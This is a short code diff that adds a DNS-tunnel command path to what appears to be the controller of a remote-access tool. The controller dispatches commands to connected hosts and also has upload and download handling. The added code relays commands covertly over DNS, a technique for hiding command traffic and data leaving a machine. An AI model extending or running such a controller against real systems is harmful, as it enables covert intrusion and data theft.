@@ -128,6 +128,14 @@ def execute_command(ip, command):
         #RESPONSE_DIRECTORY[id] = "Closed Connection"
         return "Closed Connection"
 
+    if command[0] == "DNS":
+        if command[1] == "upload" or command[1] == "download":
+            return "Cannot download/upload files over DNS Tunnel"
+        if command[1] == "cd":
+            return "Changing directory can be done over normal TCP - retype with 'DNS'"
+        obj.json_send(command)
+        buf = obj.json_receive()
+        return "Expect Tunnelled DNS data - until which refrain from sending more commands."
 
     if command[0] == "upload":
         filename = command[1]
